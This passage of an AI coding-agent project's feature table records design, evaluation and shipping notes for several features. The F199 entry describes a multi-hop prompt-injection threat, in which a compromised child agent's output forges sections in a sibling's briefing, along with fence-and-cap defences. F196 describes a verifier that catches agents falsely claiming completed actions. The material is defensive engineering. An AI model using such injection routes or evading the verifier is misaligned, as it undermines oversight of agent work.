| `199` | Sibling-Aware Child Dispatch — `task_id:<id>` Evidence Refs (F177 Snapshot Reuse) + Unknown-Prefix Visible Error | Internal / Architecture | Medium | `v0.7.44` | [v0.7.44](features/v0.7.44.md#feature_199-sibling-aware-child-dispatch) | **✅ SHIPPED 2026-05-26 (立项 + ship 同 session, single-commit atomic) + 2026-05-28 security harden (finalText fence-wrap + cap)** — Phase 1 code (`resolveEvidenceRef` adds `task_id:` branch + flips unknown-prefix fallthrough to visible error, ~30 LoC at [`child-executor.ts:526-588`](../packages/coding/src/child-executor.ts#L526-L588)) + Phase 2 unit tests (9 PASS = 3 regression for `file:` / `diff:` / `finding:` + 5 new `task_id:` lifecycle terminals + 1 unknown-prefix visible-error guard) + Phase 3 tool schema description ([`registry.ts:471`](../packages/coding/src/tools/registry.ts#L471) appends `"task_id:<child_id>"` + unknown-prefix error mention) + Phase 4 Layer 2 eval **5-alias canonical panel** × C1 × 3 runs = 15 probe + 45 audit calls = 60 LLM calls. **Phase 5 security harden (post-architect/security review 2026-05-28)** — `finalText` 注入到下一个 child briefing 现在: (a) 用 ` ``` ` code-fence 包裹（防 `### file: /injected` 等 Markdown-/XML-mimicking 序列突破 briefing framing 注入伪造段）; (b) 10000 字符上限 + truncation marker (`[…truncated N chars; use \`task_output\` for the full text]`，匹配 `diff:` 既有 4000 字符 cap pattern); (c) body 内 literal ` ``` ` 用零宽分隔符 defang，防 fence 早闭。Threat model: 受污染 child（处理外部 web 内容/文件/用户输入）的 `finalText` 通过 `task_id:` prefix 多跳 prompt-injection 到 sibling — pre-harden 是 verbatim inline，post-harden 全部 contained. First panel run used canned `task_id="scout"`; reader flagged hygiene issue (FEATURE_193 retired V1 Scout role → risk of training-data muscle-memory false positive). Panel **re-run with canned id renamed to `"hooks-audit"`** (FEATURE_193-clean, non-V1). **Probe 11/15 aggregate regex PASS** — `kimi=3/3 (100%) / ark/v4flash=3/3 (100%) / ark/v4pro=3/3 (100%) / mmx/m27=2/3 (67%) / zhipu/glm51=0/3 (0%)`; 4/5 alias trigger MET per pre-registered ≥4/5 SHIP gate. **ID transfer correctness 11/11 PASS runs** — every adopting model read the canned id literally, proving prefix adoption is driven by block content not V1-role familiarity. **3-judge LLM-judge audit (zhipu/glm51 + ark/v4pro + kimi panel-internal per anti-pattern 7 §3) = 0/15 disagreement DATA VALID**. **zhipu/glm51 0/3 failure mode** = re-narrate scout findings inside `objective` string instead of using `task_id:` prefix = structural floor pattern per [[feedback_model_structural_floor_not_prompt_tunable]] (same family as kimi's prior single-alias DEFERs); single-alias DEFER per [[feedback_pre_registered_gate_saturation]] does not block SHIP. SHIP gates (a)+(a')+(b) all MET; **no worker-role-prompt teaching block added** — 4/5 canonical aliases discover the new prefix from the tool schema description alone. Eval drivers retained as permanent regression sweep at [`tests/feature-199-task-id-evidence-ref.eval.ts`](../tests/feature-199-task-id-evidence-ref.eval.ts) + [`benchmark/datasets/feature-199-task-id-evidence-ref/cases.ts`](../benchmark/datasets/feature-199-task-id-evidence-ref/cases.ts) with production-byte tool description embedded (anti-pattern 8 compliant). Dump path: `os.tmpdir()/kodax-eval-dumps/feature-199-task-id-evidence-ref/`. **0 regressions in coding package full suite** — 6 pre-existing F168 schema-parity baseline failures unchanged. **Original design notes (preserved for ADR-style replay)**: 3-agent 调研讨论（architect / contrarian / planner 三视角并行）后定型。父 Worker 派完 child A 后想把 A 的 `finalText` 转交给后续派的 child B 时，现有 4 个 `evidence_refs` prefix（`file:` / `diff:` / `finding:`）都不够 — 父被迫 copy-paste A 的 summary 到 `finding:` 或自己 LLM-消化转述，信息保真度下降 + 多花 1 个推理 turn。**方案**: 新增 `task_id:<child_id>` prefix，harness 在 `resolveEvidenceRef` 从 [FEATURE_177 `childProgressSnapshots`](../packages/coding/src/child-progress-snapshot.ts)（ring buffer cap=200, `finalText` 在子 settle 时 finalize）直接拉子的完整产出，**零跨包 plumbing 零新数据结构**。**顺带 bug 修**：`resolveEvidenceRef` unknown-prefix 现在静默 fallthrough（`return - ${ref}`）改成可见 error 字符串让父 LLM 看到 prefix 写错可以纠正——替代了原 typed-objects 提案的目标（让错误显式化），但不破坏 string-prefix schema，0 prompt-eval baseline 破坏。**不做**：(1) typed objects 替代 string-prefix schema（`project_tool_schema_slim_eval_v0_7_41_defer` 验证 floor LLM 上 nested JSON 比 string-prefix 更差，结构性 fit 反 LLM）；(2) `tool_result:<call_id>` prefix（ACP-based providers Gemini CLI / Codex CLI 的 `toolBlocks=[]` 永不暴露 `tool_use_id`，12 provider 里 2 个先天不支持 + LLM 无法稳定 verbatim recall opaque SDK ID）；(3) 子→父反向 fetch context（破坏 isolation 边界，F123 `send_message(to="worker")` 已覆盖中途通报需求）；(4) 自动 relevance 注入 parent transcript（业界共识 Claude Code / Cursor / OpenHands 全部 explicit-parent-write 路线，per [Anthropic Seeing like an agent](https://claude.com/blog/seeing-like-an-agent) + Princeton NLP "single agent 64% benchmark 匹配/超过 multi-agent" 数据，避免 "noisy over-sharing"）。**边界条件全有可观察输出**：completed → 注入 `finalText`；failed/aborted → 注入 finalText 含 diagnostic envelope（mode / iterations / readOnly / parentRole）；running → `(still running — use task_output to poll)` 友好降级；not-found / 已 cap-prune → `(child unknown or sync-dispatch mode)`；sync-dispatch (`KODAX_ASYNC_DISPATCH=0`) → snapshots=undefined 同 not-found。**Eval per [EVAL_GUIDELINES.md](../benchmark/EVAL_GUIDELINES.md)**：Layer 1 = unit tests (resolveEvidenceRef 8 test - 3 regression for `file:` / `diff:` / `finding:` + 5 new for task_id 各 lifecycle 状态 + unknown prefix visible error)；Layer 2 = pilot 1 alias × 1 case × 3 runs `ark/v4flash` 验证 LLM 看 tool schema desc 能自发用 `task_id:<id>`（pre-registered trigger 成立条件: ≥1/3 runs emit `task_id:`；< 1/3 则补 worker-role-prompt 一句 qualitative SPECIALIST-style 指引 + 重 pilot，不进 5-alias panel per anti-pattern 9 — 这是行为中性 schema 扩展非 lift refactor）。**3-judge LLM majority audit 强制** per anti-pattern 7 §3（zhipu/glm51 + ark/v4pro + kimi 三家 panel-internal，**禁止 anthropic/openai 当 judge** per Judge 模型选择约束）。raw dump → `os.tmpdir()/kodax-eval-dumps/feature-199-task-id-evidence-ref/`（per §Raw output preservation，不入 repo 工作树）。**Acceptance**（pre-registered）：(a) Unit tests 全 PASS（3 regression + 5 new = 8 tests）；(b) `npx tsc --noEmit` clean；(c) Layer 1 完成后 Layer 2 pilot: ark/v4flash 在构造 history（已完成 sibling `<task-completed task_id="scout">` + 用户请求 follow-up）的 case 上自发 emit `evidence_refs: ["task_id:scout"]` ≥ 1/3 runs（trigger 成立 → SHIP；< 1/3 → worker prompt 补一句 + re-pilot）；(d) 3-judge audit disagreement ≤ 10% DATA VALID per anti-pattern 7 §3；(e) `npm run build:packages` 全绿 per [[feedback_workspace_packages_need_rebuild]]；(f) child-executor 既有 30 test 全 PASS（regression guard）；(g) 工具 schema description 字符串追加 `"task_id:<id>"` 是低风险增量描述，**不**触发完整 ADR-033 5-alias panel（per anti-pattern 9 behavioral-neutral hygiene refactor + 加 1 个 prefix 是 vocabulary 扩展不是行为重塑）。**预算**：~$0.5-2 eval（pilot $0.05 + audit $0.5-1） / 0.5-1 工作日 / ~25 LoC 实现 + ~120 LoC 测试 / single-commit atomic ship after pilot PASS。**冲突管控**：与 F192 Phase F (v0.7.45) goalContext wiring + F189-extended worker-role-prompt sweep 全部解耦——本 feature 只动 [`child-executor.ts:resolveEvidenceRef`](../packages/coding/src/child-executor.ts#L526-L559)（~20 LoC 新分支）+ [`tools/registry.ts:471`](../packages/coding/src/tools/registry.ts#L471) description 追加（1 行）+ `child-executor.test.ts` 8 个新 test，0 worker-role-prompt overlap，0 跨包 plumbing。**Non-goals**：(1) typed objects schema 重构（drop per contrarian / ADR-033 §6 floor LLM 数据支撑）；(2) `tool_result:<call_id>` prefix（drop per architect — `KodaXToolExecutionContext` 不持有父 message history + ACP 不支持 tool_use_id）；(3) child-progress-snapshot.ts 任何改动（复用现有 `finalText`，cap=200 ring buffer 满足）；(4) sync-dispatch 路径 snapshot init（legacy escape hatch `KODAX_ASYNC_DISPATCH=0` 不为新功能扩 scope）；(5) `task_id:` 同时支持 spell variant 如 `task:` / `child:`（YAGNI，单一规范名字 + unknown-prefix visible error 引导）。**风险 + 缓解**：(R1) Worker LLM 不自发用 `task_id:` 只读 schema description（Layer 2 pilot 验证；< 1/3 trigger → worker prompt 补一句 qualitative，不进 panel）；(R2) `finalText` 在 specialist 子里太大（已过 `applyChildSummaryGuardrailWithSummarizer` 50KB spill + 100KB LLM-summarize，不会爆 — 复用 F121/F177 已有保护）；(R3) child running 时 ref 注入 friendly fallback 引导用 `task_output` 工具（per F177 已有 polling 路径）；(R4) Worker 派 grand-child 时 grand-child registry 与 parent registry 共享导致 `task_id:` 跨边界引用 → 复用 F123 `inheritedChildTaskRegistry` 字段，grand-child 看父 + sibling snapshot 一致行为；(R5) cross-thread git race — 本 feature 0 文件 overlap 与 F192/F198 已 ship 文件，atomic single-commit。**参考**：discussion sessions 2026-05-25/26（3 sub-agent verdict converge: A `tool_result:` drop / B `task_id:` ship F177-reuse simplified / C typed-objects defer 改 unknown-prefix visible error），[FEATURE_177 task_output — design in v0.7.42.md, shipped v0.7.45](features/v0.7.42.md)（不存在则 fall back to v0.7.42 中 F177 entry），[EVAL_GUIDELINES.md](../benchmark/EVAL_GUIDELINES.md) anti-pattern 7 + 9 + 11，[[project_tool_schema_slim_eval_v0_7_41_defer]]，[[feedback_model_structural_floor_not_prompt_tunable]] |
| `128` | ~~Dispatch-to-Self-Construction Bridge — subagent_type Field + Dynamic Agent List Cache~~ | ~~Internal / Architecture~~ | ~~Medium~~ | ~~`v0.7.50`~~ | [v0.7.50](features/v0.7.50.md#feature_128-dispatch-to-self-construction-bridge) | **Superseded by FEATURE_191 v0.7.43**: 原 v0.7.50 placeholder 仅覆盖 dispatch 桥（Phase A），无 markdown loader (Phase B) + extension `registerAgent` (Phase C)，scope 不足以闭环 user-authored custom agents。FEATURE_191 在 v0.7.43 一次性覆盖 A+B+C 三 phase，128 设计稿保留为历史参考 |
| `189-extended` | Full Prompt Audit — ADR-033 5 Principles Across All LLM-Facing Prompts | LLM Prompt / Quality / Systemic Refactor | High | `v0.7.43` | [v0.7.43](features/v0.7.43.md#extended-scope-全-prompt-audit-v0743-release-window-内完成) | **2026-05-24 立项 + 同 release window 内完成**——用户授权 v0.7.43 完整收尾 FEATURE_189 而非 push 到 v0.7.44（"时间代价可以接受 189 请完整收尾"）。升级 v0.7.43 FEATURE_189 局部整改（B.1-B.5 + Batch 1-5 + B.3 + todo desc layered restructure）到 KodaX **全部 LLM-facing prompt 体** ADR-033 5 原则系统性 audit。**Extended scope**：剩余 ~30+ tool descriptions in `registry.ts` + capability-sections.ts 13 段（FEATURE_142 SoT） + builder.ts / system.ts 组装层 + `task-engine/_internal/managed-task/role-prompt.ts` + `coding-preset.ts:DEFAULT_CODING_INSTRUCTIONS` + `protocol-emitters.ts` prompts + `sidecar-verifier-prompt.ts`。**4 phase**：(A) Audit pass $0 — per-file × 5 原则 violation grid + priority 排序 + 每段 SHIP gate 预注册；(B) High-frequency path sweep — per-block independent Layer 2 evidence-driven SHIP gate；(C) Low-frequency / legacy prompt sweep — Layer 1 content-equivalence + unit test，no Layer 2；(D) Eval drivers upgrade — synthetic prompts 含 production tool descriptions per EVAL_GUIDELINES 反模式 8。**预算**: ~$40-60 eval / 7-9 工作日（用户授权时间代价可接受）。**Non-goals**: ❌ `todo_*` defer 实验（用户 2026-05-24 明确表态保持 always-loaded per `feedback_todo_tools_keep_always_loaded`）❌ DEFERRED_TOOL_HINTS 收缩 ❌ ADR-033 §4 §5 跨段强制 sweep（per-block evidence-driven 必要）❌ Prompt 行为效果 lift（hygiene 非 behavioral feature）。**Decision basis**: v0.7.43 教训 [[feature-189-b4-deferred]] [[feature-189-b5-deferred]] [[adr-033-enumerated-per-block-evidence]] + `feedback_simplifying_prompt_can_regress` + `feedback_eval_panel_floor_saturation` + EVAL_GUIDELINES 反模式 8-11（synthetic fidelity / behavioral-neutral refactor / DROP recheck / floor saturation override） |
| `193` | V1 Chain Full Retirement — Scout/Planner/Generator Entry Routing + Emit Tools + Role Prompts + Data Structures + Eval Archive | Internal / Architecture + Refactor | High | `v0.7.43` | [v0.7.43](features/v0.7.43.md#feature_193-v1-chain-full-retirement) | **2026-05-23 立项 + v0.7.43 release window 内 ship**——FEATURE_189 Batch 5 收尾时 audit 出 V1 chain（Scout/Planner/Generator） 仍以 6 种残留形态留在 codebase：(1) `runner-driven.ts:1408-1431` entry routing 三元 + L776 initialHarness 切换；(2) `agent-chain.ts` 仍 build chain.scout/.planner/.generator + emit tools + handoffs；(3) `role-prompt.ts` / `role-prompts.ts` 维护 V1 role instructions；(4) `protocol-emitters.ts` export `emit_scout_verdict` + `emit_contract` tool + emitter；(5) `managedTask` data structures (`roleAssignments: 'scout'\|'planner'\|'generator'\|'direct'` / `harnessProfile: H0_DIRECT\|H1_*\|H2_*` / `harnessTransitions`) + recorder slots；(6) `isHarnessV2Enabled()` flag + verdict-recorder.ts:332/482 + observer-bridge.ts:353 V1 branches。Scope = 26 文件 + ~50+ 测试 + ~2000-3000 LoC 净减。**5 commit dependency-ordered atomic ship**：(1) V1 test surface 删 (10 文件，~50+ tests，LOW risk test-only，1-1.5 天) → (2) runner-driven.ts entry simplification + isHarnessV2Enabled() 删 + verdict-recorder/observer-bridge V1 branch 删（MED risk runtime entry change，0.5 天）→ (3) V1 chain agents 删（agent-chain.ts + coding-agents.ts + task-engine-agents.ts V1 stubs，LOW risk 0.5 天）→ (4) V1 prompts + emit tools 删（role-prompt + role-prompts + protocol-emitters emit_scout_verdict + emit_contract + parse-helpers + tool-permission + scope-aware-harness-guardrail，LOW risk 0.5 天）→ (5) SDK exports + V1 type union 成员 + V1 eval files archive (tests/eval-scout-* / ama-harness-selection* / feature-097-h0-* / feature-114-scout-* → tests/_archive/) + ADR-030 V1 retirement section + CHANGELOG entry（MED risk 1 天）。**关键 insight**：把 V1 测试删除（Commit 1）放在 V1 production code 删除（Commit 2-4）之前，每 commit 保持测试绿 — 最大风险 commit 1 是 test-only 改动，no production behavior risk。**Acceptance**: build clean (`tsc --noEmit`) + 全量 vitest 绿 每个 commit 后 + FEATURE_184/F190/F189 既有测试 0 改动 + V2 路径 byte-identical 入口 routing + V2 eval 数据 0 invalidate（V1 删除不动 V2 prompt 内容）。**Non-goals**: 不重做 V1→V2 行为对比 eval（V1 已 dead code）/ 不动 SCOUT_AGENT_NAME 等 string literal 常量名（保留历史 session id 兼容）/ 不删 V1 checkpoint 文件兼容性（resume 时 fall back to Worker）。**冲突管控**：与 FEATURE_191（Phase B worker-role-prompt + role-prompts 共享）按顺序排 — Commit 4 前 `git fetch` + selective-hunk staging 兜底。**预算**: $0 eval / ~3.5-4 工作日 / single-actor coordinated atomic ship |
| `195` | Sidecar Verifier UI Silent Accept — Default-Hide Accept Verdict Evidence Entry + Transcript-Mode Opt-In | Enhancement / UX | High | `v0.7.43` | [v0.7.43](features/v0.7.43.md#feature_195-sidecar-verifier-ui-silent-accept) | **2026-05-24 立项 + v0.7.43 release window 内 ship**——用户实战 session 截图反馈：F184 sidecar verifier 在每个 Worker text-only termination 后写一条 `[Evaluator] <verdict.reason>` event-item 进 transcript（即便是 "你好 → 你好!" 这种零 action surface 的对话也照出），背离 F184 设计意图（per `verifier.ts` JSDoc + ADR-030 §F184 "silent accept" — accept verdict 应只走 session.jsonl + artifact，UI 只该看 `[AMA Verifying]` spinner 期间）。**Root cause**: [`verifier-recorder-bridge.ts:94`](../packages/coding/src/agent-runtime/middleware/sidecar-verifier/verifier-recorder-bridge.ts#L94) 写 `role: 'evaluator'` + `payload.verdict.reason` 进 `recorder.verdict`，[`payload-builder.ts:281-298`](../packages/coding/src/task-engine/_internal/managed-task/payload-builder.ts#L281-L298) 把它 surface 进 `task.verdict.summary`，[`InkREPL.tsx:574-624`](../packages/repl/src/ui/InkREPL.tsx#L574-L624) `buildManagedTaskTranscriptItems` 无差别 render 为 event-item — accept/revise/blocked 全显示。**Fix scope (REPL UI layer only — render filter)**：(1) `buildManagedTaskTranscriptItems` 增加 `evidence.entries` filter：source==='sidecar' AND status==='accept' AND no `userAnswer` → skip event-item creation；(2) revise/blocked verdict 永远显示（用户 actionable）；(3) `userAnswer` 非空时永远显示（accept 同时附带 `userAnswer` 是 sidecar 真有信息要传递的 case，不算 silent）；(4) opt-in opt-out 通过 `KODAX_VERIFIER_LOG=1` 环境变量（已存在 — F184 Phase D.3 加的）+ 新增 `verifierLog: true` 在 `~/.kodax/config.json` revealing all verdict entries；(5) 数据层 0 改动 — `recorder.verdict` 仍写入 session.jsonl + artifact，replay / debug / scorecard 全完整。**Acceptance**（pre-registered）：(a) 实测 `你好 → 你好!` 对话 transcript 不再出现 `[Evaluator]` 行 + sidecar 仍在跑（log 验）；(b) revise/blocked verdict 仍 surface；(c) `KODAX_VERIFIER_LOG=1` 开启时 accept 也 surface；(d) `session.jsonl` 数据完整 0 信息丢失；(e) 8 个新 unit test (InkREPL.managed-transcript.test.ts) 覆盖 4 个 verdict 状态 × 2 个 opt-in mode；(f) `npm run build` + 全套 vitest 绿。**Non-goals**：(1) 不动 `recorder.verdict` / `payload.verdict` 数据 schema（破坏 SDK 兼容）；(2) 不删 evidence entry 写入（只是 render filter — 保 replay）；(3) 不动 F184 verifier 本身的 fire 逻辑（那是 F196 scope）；(4) 不引入 verbose mode 概念（YAGNI；env var + config bool 双 opt-in 已够）。**冲突管控**：与 F194 mcp package consolidation 并发但 0 文件 overlap (F194 改 packages/mcp + packages/agent + coding tsconfig，F195 改 packages/repl InkREPL.tsx)。**预算**: $0 eval（render filter，无 LLM-facing prompt change） / 0.5-1 工作日 / ~30 LoC 实现 + ~80 LoC 测试 / single-commit atomic ship |
| `197` | Read-Only Markdown Agent Discovery — `discoverMarkdownAgents` SDK API (F191 follow-up对标 F035 `discoverSkills`) | Enhancement / SDK Surface | Medium | `v0.7.43` | [v0.7.43](features/v0.7.43.md#feature_197-read-only-markdown-agent-discovery) | **2026-05-24 立项 + 同 session ship**——KodaX Space (SDK 消费方) 反馈：F191 `loadAgentsFromMarkdown` 触发 admission + 全局 registry 注册 side effect，他们想做 "agent picker" UI（让用户 preview 已有 markdown agents 后选择性激活），现有 loader 形态不匹配。`listConstructedAgentsWithSource` 虽然技术上能 list，但是 `@internal` 标记的、明确写 "NOT yet a stable SDK surface; embedders SHOULD continue using `listConstructedAgents()`" —— 不能给 SDK consumer 用。F035 `discoverSkills(root?, customPaths?)` 是 pure read-only 形态，F191 没有对应的 read-only counterpart 是 SDK surface 设计 gap。**Fix**：抽 `parseMarkdownAgentFile(filePath)` shared helper（loader 和 discover 共用），新增 `discoverMarkdownAgents(opts): Promise<{agents: DiscoveredMarkdownAgent[], failed: MarkdownLoadFailure[]}>` 公开 API：扫描同 two-tier path (user → project) → 返回 metadata `{name, description, source, path, tools?, model?}`，**零 admission / 零 registration / 零全局 registry mutation**。最末 last-write-wins 与 loader parity（project 同名 shadow user）。Tools 字段返回 raw 名字不带 `builtin:` 前缀（discovery 暴露用户写的形态）。**Validation 边界**：discover 不验 admission（unknown tool ref / handoff cycle 等都 surface），admission 仍在 `loadAgentsFromMarkdown` 兜底 — 这跟 F035 discoverSkills 不验 skill admission 对齐。**测试**：15 个新 unit test 覆盖 empty/missing-frontmatter/missing-name/missing-description/empty-body/project-shadows-user/tools-array/tools-csv/model-passthrough/admission-not-validated/loader-roundtrip-parity + **"discovery is read-only"硬契约** (assert `listConstructedAgents().length` 不变 + `resolveConstructedAgent(name)` undefined after discover) |
| `196` | Sidecar Verifier Content-Aware Gate — Action-Surface Detector + Conversational User-Intent Skip | Internal / Architecture + UX | High | `v0.7.43` | [v0.7.43](features/v0.7.43.md#feature_196-sidecar-verifier-content-aware-gate) | **2026-05-24 立项 + v0.7.43 release window 内 ship 在 F195 之后**——同 session 用户反馈：F184 sidecar verifier 在 "你好" 这种零 action surface 对话上无差别 fire（3-10s tail latency + verifier call cost），概念上 misuse — F184 设计动机（per `project_feature_184_shipped`）是抓 zhipu intent-vs-action floor（"明白，我用 todo_create..." 但没真调 tool），不是对话内容审查器。**Root cause**: [`runner-driven.ts:1508-1565`](../packages/coding/src/task-engine/runner-driven.ts#L1508-L1565) `composedStopHook` 的 gate 只有 `isExecutionRole === 'worker'` + `!isIdleYieldTurn` + `sidecarVerifierHook` installed，**没有 turn-content 维度的 gate**。**2-layer gate design (per 2026-05-24 design session)**：**Layer 1 — action-surface 检测**: turn 内有 file mutation (write/edit/multi_edit/insert_after_anchor) OR todo completion transition (in_progress→completed) OR dispatch_child_task fired → 一定 fire（F184 核心使命 — 抓 hallucinated completion）；**Layer 2 — user intent 检测**: Layer 1 全 0 时，看用户最近 message — conversational greeting regex 命中（greeting prefix `你好|hi|hello|早|thanks|谢谢` + 长度 ≤ 20 char + 无 imperative verb `查|读|修|改|run|fix|check|show|implement|build`）→ skip；其它（imperative + zero action = zhipu floor 复现 case）→ fire。**Escape hatch**: `KODAX_VERIFIER_ALWAYS=1` env var 强制 100% fire（debug + regression sweep + paranoid mode），default OFF。**Layer 2 eval design** (pre-registered SHIP gate)：panel 5 alias (zhipu/glm51 + kimi + mmx/m27 + ark/v4flash + ark/v4pro) × 4 case (C1 greeting trivial chat → expect skip / C2 imperative + zero action = zhipu floor 复现 → expect fire / C3 mutation + honest complete → expect fire + accept / C4 mutation + hallucinated complete → expect fire + revise/blocked) × 5 run = 100 cells + 3-judge LLM majority audit (zhipu + ark/v4pro + kimi panel-internal per EVAL_GUIDELINES anti-pattern 1)。**Pilot 1×1×1 ark/v4flash 先验 C1 greeting case 触发 skip + C2 imperative case 触发 fire**。**Pre-registered SHIP gate**: (a) C1 skip rate ≥ 95% per alias (trivial 真的不 fire — 用户 UX 直接收益); (b) C2 fire rate ≥ 95% per alias (zhipu floor 兜底 — F184 核心契约不能漏); (c) C3 fire + accept rate ≥ 90% per alias (honest complete 不被误判); (d) C4 fire + catch (revise OR blocked) rate ≥ 80% per alias (hallucinated 抓得到); (e) judge disagreement < 10% DATA VALID per anti-pattern 7 §3; (f) 5/5 alias 满足 (a)+(b)+(c)+(d) ⇒ SHIP / 4/5 满足 ⇒ evidence-driven override per `feedback_pre_registered_gate_saturation`（单 alias 失败需 audit raw dump 判 model floor vs gate bug 再决策）/ ≤3/5 满足 ⇒ DEFER。**Acceptance**: 5 new unit test (gate-helpers.ts: detectActionSurface + detectConversationalIntent + composeGateDecision) + 3 integration test (composedStopHook fire/skip routing) + Layer 2 panel + audit + raw dump (artifact 留作永久 regression sweep `tests/feature-196-sidecar-content-gate.eval.ts`)。**Non-goals**: (1) 不引入 LLM-based intent classifier（YAGNI + 加一次 LLM call 反而抵消省下来的 sidecar call）；(2) 不动 F184 verifier 本身的 prompt 或 retry 逻辑（已 stable per `project_feature_184_shipped`）；(3) 不引入"user intent 提示符"或 ✗ 反模式 LLM 提示（per ADR-033 §3 - regex 是 deterministic / off-LLM gate，不上 prompt 复杂度）；(4) 不做 multi-turn intent tracking（v0.7.43 scope 单 turn user message 已够；future v0.7.46+ 可加 conversation-context gate 独立立项）。**Risk**: (R1) regex 漏判 imperative-but-short user message（e.g. "修 bug"）→ 错 skip + 漏 zhipu floor catch — 缓解 = imperative verb 列表充分覆盖中英双语 + Layer 2 eval C2 case 验证；(R2) 用户使用脱离正常对话模式（e.g. 全英 "stop bugging me with verifier on small talk"）触发 gate 但被理解成 imperative — 缓解 = 长度 ≤ 20 char 上限阻止长复杂 message 被错判 conversational + escape hatch env var 兜底；(R3) cross-thread git race on runner-driven.ts — 与 F194 同期 (F194 改 packages/mcp + agent + coding tsconfig，runner-driven.ts 0 overlap)；(R4) F195 ship 后 silent accept 隐藏 evidence entry，F196 fire 错判时用户难发现 — 缓解 = `KODAX_VERIFIER_LOG=1` 反向兜底（accept entry 仍可见）。**预算**: $10-15 Layer 2 eval (panel $7-10 + audit $3-5) / 1.5-2 工作日 / ~120 LoC 实现 (gate helpers + composedStopHook 集成) + ~80 LoC 测试。**参考**: F184 design doc / `project_feature_184_shipped` memory / `feedback_pre_registered_gate_saturation` (gate saturation 处理) / `feedback_model_structural_floor_not_prompt_tunable` (zhipu floor 处理) / `feedback_canonical_eval_alias_panel` (5 alias panel) / ADR-030 §F184 |
| `194` | Package Consolidation — Inline mcp / skills / tracing / session-lineage + repointel-protocol Subpackages — 9 → 4 Workspace Packages | Internal / Architecture + Refactor | Medium | `v0.7.43` | [v0.7.43](features/v0.7.43.md#feature_194-package-consolidation) | **✅ SHIPPED 2026-05-24** — 9 commits atomic ship `b7235f0e → ced8a30d → 801eeae5 → c1301898 → 1fb0433a → 7523a5c0 → 324779b4 → 3bb70d1e → 本 commit`. 9 → 4 workspace packages 目标达成：`@kodax-ai/{llm 7.3k, agent 20.8k (吸收 mcp+skills+tracing+session-lineage), coding 66.4k (吸收 repointel-protocol), repl 37.7k}`. 每 commit 5-gate 全 PASS (G1 tsc / G2 vitest 16 baseline 0 regression / G3 build / G4 API surface preserved—agent 155→202 exports +47 session-lineage symbols / G5 smoke). $0 eval. Latent `agent/package.json` 未声明 session-lineage dep 修复自动消除. **历史立项内容(参考)**：LoC measurement 重新核对后真实数据：KodaX 9 包共 ~132k LoC（coding 66k + repl 38k + agent 9k + session-lineage 5.6k + mcp 2.7k + skills 2.5k + llm 7.3k + tracing 0.8k + repointel 0.07k），**比 pi 4 包还大不是更小**——KodaX 是"投入更多能力（construction / repo-intelligence / task-engine 复杂 / multi-tier middleware）但同时把包结构碎切"。合并目的**不是减代码**，是**减包数对应的 carrying cost**（10 包 npm publish / 9 包 build graph / 跨包 jump-to-source）。9 包里 5 个明显过度切分（grep 实测全部 0 外部 npm consumer，违反 CLAUDE.md YAGNI "3+ use cases" 标准）：(1) `@kodax-ai/mcp` 2.7k，consumer = coding 7 + repl 2 + root src 1；(2) `@kodax-ai/skills` 2.5k，consumer = coding 5 + repl 5 + root src 2；(3) `@kodax-ai/tracing` 0.8k，consumer = agent 7 + coding 2，agent self-merge；(4) `@kodax-ai/session-lineage` 5.6k，**包描述自认 "@kodax-ai/agent 的会话子系统"**，consumer = agent 4 + coding 30+ + repl 4，**存在 latent bug**：agent 4 个源文件 import 它但 agent/package.json 没声明 dep（monorepo workspace 下靠 tsconfig path 能跑，发布 npm 会断）；(5) `@kodax-ai/repointel-protocol` 69 LoC，注释承诺 "multi-host (kodax/codex/claude/opencode) 共享" 是**意图非事实**——0 外部消费者，仅 coding/repo-intelligence/ 3 个文件用。**目标结构 4 包对齐 pi 4 包数量**：`@kodax-ai/{llm 7.3k, agent 20.8k (吸收 mcp+skills+tracing+session-lineage), coding 66.4k (吸收 repointel-protocol), repl 37.7k}`。**实施分 9 commit dependency-ordered atomic ship**（hybrid soft-delete 仅对最高风险包拆 a/b）：(0) baseline 5 项快照 → (1) mcp inline + delete → (2) skills inline + delete → (3) tracing inline + delete → (4a) **session-lineage inline (MED risk, agent compaction critical path, stub remains) + 跑 compaction.test 全套 + agent runner.test + 多个 cap-* contract test** → (4b) **删 session-lineage stub 目录 + 验 reverse-grep 0 remaining** → (5) repointel-protocol inline 到 coding/src/repo-intelligence/protocol.ts + delete → (6) workspace 收尾（release-npm.mjs 包列表 + root tsconfig paths + README package list）→ (7) ADR-036 finalize + CHANGELOG v0.7.43 breaking note + sed migration template + memory + FEATURE_LIST status。**前置 gate**：FEATURE_193 12-commit 完整 push + 全测试绿 baseline + git working tree clean per [[feedback_no_parallel_refactor_paths]] 不并发。**Acceptance**（pre-registered）：`npx tsc --noEmit` clean across all packages 每 commit 后；全量 vitest 绿 每 commit 后；**0 test file content change**（仅 import path 字符串替换）；`npm run build:packages` 全包 dist 正确 per [[feedback_workspace_packages_need_rebuild]]；`npm publish --dry-run` 在 4 个 publishable 包上 PASS；公开 API zero behavior change（顶层 + subpath re-export 双路径）；**agent compaction.test 全套绿（session-lineage commit 的关键 gate）**；FEATURE_124 memory eval `tests/compaction-prompt.eval.ts` 语义不变（仅 import 路径替换）；**0 prompt eval**（纯结构重构）。**Non-goals**：不动 `llm` 内部结构 / 不动 `coding` 除 repointel-protocol inline 到 repo-intelligence/protocol.ts / 不动 `repl` 内部结构 / 不引入聚合包名如 `@kodax-ai/agent-capabilities`（YAGNI，capabilities 类型未收敛到 3+ 案例）/ 不为旧 5 个包保留 stub（仅当 npm view 显示真实下载量非零再 case-by-case）/ 不动 v0.7.35.1 FEATURE_142 Batch B "session-lineage 从 agent 拆出去" 之外的其它历史结构变更（保持 scope 限定）。**风险 + 缓解**：(R1) **session-lineage 合并是这次唯一 MED risk** — agent/primitives/{session,compaction}.ts + 4 文件 import session-lineage 路径替换 + compaction-orchestration middleware critical path，缓解 = 4a/4b 拆 soft-delete 两步 + 每 sub-commit 强跑 compaction.test 全套 + agent runner.test + cap-014/028/055/056/059/060/062/063 全部 contract test；(R2) skills 失去 zero-dep — agent transitive deps 暴露，subpath export `@kodax-ai/agent/capabilities/skills` 兜底 tree-shake；(R3) cross-thread git race on coding/src/ — atomic ship 前 `git fetch && git status` + 必要时 `git add -p` per [[feedback_selective_hunk_staging]]；(R4) repointel-protocol 未来如 codex/claude 真要接需 re-extract — 69 LoC 纯 type 文件，未来 30 分钟工作量可接受；(R5) 外部 npm consumer breakage — npm view 5 包 download stats 确认（基本预计零）+ CHANGELOG breaking note + sed 替换模板 per FEATURE_147 playbook；(R6) latent bug 修复 — agent/package.json 加 session-lineage 内联后自动消除 import-without-dep mismatch。**预算**: $0 eval / 2.5-3 工作日 / single-actor coordinated atomic ship / ~84 import 